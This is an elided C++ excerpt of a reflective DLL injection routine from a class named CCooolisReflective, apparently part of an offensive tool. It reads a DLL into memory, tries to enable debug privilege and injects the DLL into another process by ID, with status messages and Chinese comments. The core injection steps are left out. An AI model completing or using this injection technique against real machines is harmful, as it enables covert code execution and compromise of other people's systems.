...
BOOL CCooolisReflective::ReflectiveInject(DWORD dwProcessId, std::string sReflectiveDllName)
{
	...
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cout << "[-] Failed to open the DLL file." << std::endl;
		return FALSE;
	}
	...
	if (!lpBuffer) {
		std::cout << "[-] Failed to get the DLL file size." << std::endl;
		return FALSE;
	}
	// 读取到堆内存中
	if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE) {
		std::cout << "[-] Failed to alloc a buffer!" << std::endl;
		return FALSE;
	}
	// 尝试提升本程序的Debug权限
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		...
		std::cout << "[-] Failed to set process DEBUG Privilege." << std::endl;
		return FALSE;
	}
	// 打开进程
	...
	std::cout <<"[+] Injected the " << sReflectiveDllName << " DLL into process : " <<  dwProcessId << std::endl;
...
BOOL CCooolisReflective::ReflectiveInject(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
{
	...
	std::cout << "[+] Injected the DLL into process : " << dwProcessId << std::endl;
